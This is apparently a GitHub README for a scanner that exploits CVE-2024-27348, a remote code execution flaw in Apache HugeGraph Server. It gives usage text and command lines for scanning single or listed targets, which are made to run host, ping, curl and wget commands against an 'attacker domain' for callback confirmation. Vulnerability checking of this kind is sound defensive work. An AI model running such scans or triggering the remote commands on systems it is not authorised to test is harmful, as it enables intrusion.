# CVE-2024-27348
**For Ethical Usages only, Any harmful or malicious activities are not allowed. And it's your own responsability**

- You Can Read the analysis for the vulnerability from here: https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/

Apache HugeGraph Server RCE Scanner ( CVE-2024-27348 ), The Scanner will run 4 commands on the target (`host`,`ping`,`curl`,`wget`), As in case one of the utilities not found.

![HugeGraphRCE](https://github.com/Zeyad-Azima/CVE-2024-27348/assets/62406753/cb2dc964-23a2-4054-bb79-3757952a2ab0)

### Ping logs from targets

![Ping_Logs_Fromm_Targets](https://github.com/Zeyad-Azima/CVE-2024-27348/assets/62406753/17a5d866-6561-4d80-8998-18ec26d31dda)

### Dns lookup, web requests from targets

![http_dns_requests_from_targets](https://github.com/Zeyad-Azima/CVE-2024-27348/assets/62406753/5c285e43-d32e-41a2-994f-d1229ea8be8d)

# Usage
```
usage: [-h] [--file FILE] [--target TARGET] [--port PORT] [--domain DOMAIN]

Exploit CVE-2024-27348 Gremlin RCE in HugeGraph server from 1.0.0 Before 1.3.0

optional arguments:
  -h, --help            show this help message and exit
  --file FILE, -f FILE  File containing target addresses and ports W/ the following format: http://target,port e.x: http://localhost,8080
  --target TARGET, -t TARGET
                        Target IP address/domain
  --port PORT, -p PORT  Target port
  --domain DOMAIN, -d DOMAIN
                        Attacker domain (Your own domain to check ping/requests log)

```
## Single Target
```
python3 CVE-2024-27348_Scanner.py -t http(s)://target_address -p port -d your_domain/ip
```
## File
```
python3 CVE-2024-27348_Scanner.py -f targets_file -d your_domain/ip
```
- File content format example in `targets.txt`
